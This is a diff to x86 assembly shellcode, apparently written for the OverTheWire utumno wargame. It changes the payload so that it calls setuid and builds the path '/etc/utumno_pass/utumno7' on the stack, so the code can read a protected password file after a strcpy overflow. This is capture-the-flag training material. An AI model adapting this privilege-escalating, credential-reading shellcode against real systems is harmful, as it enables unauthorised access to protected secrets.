@@ -29,12 +29,12 @@ _start:
     xor eax, eax
     mov al, 23
     int 0x80
-    ; "/etc/utumno_pass/utumno8" pushed as six little-endian dwords.
-    ; The shellcode reads the file itself because utumno5's getchar loop has
-    ; already consumed all of stdin -- a spawned shell would get no commands.
+    ; "/etc/utumno_pass/utumno7" pushed as six little-endian dwords.
+    ; The shellcode reads the file itself; there is no shell to type into.
+    ; strcpy writes it over the return slot, so the code must be self-contained.
     xor eax, eax
     push eax                ; NUL terminator
-    push 0x386f6e6d         ; "mno8"
+    push 0x376f6e6d         ; "mno7"
     push 0x7574752f         ; "/utu"
     push 0x73736170         ; "pass"
     push 0x5f6f6e6d         ; "mno_"
